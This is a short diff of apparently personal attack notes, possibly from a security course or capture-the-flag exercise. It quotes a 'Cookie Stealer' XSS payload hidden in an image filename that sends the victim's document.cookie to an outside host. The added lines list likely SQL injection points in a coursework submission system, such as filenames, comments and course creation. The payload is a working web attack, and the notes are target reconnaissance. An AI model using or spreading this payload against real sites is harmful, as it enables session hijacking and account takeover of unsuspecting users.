@@ -63,3 +63,9 @@ Cookie Stealer code:
 
 
 "><svg onload=alert(document.location="Eponymous.csec.gr?cookie="+document.cookie)>.png
+
+
+Pithana sql injections:
+-- Ypovoli ergasias xristi (ap to comment dyskola ine teleftaio, ap to filename ginetai logika)
+-- Insert/Update ergasias (gia ypovoles) apo admin (sta comments sto onoma kati)
+-- create course (kainourgio mathima) tha exi injection ine stegno
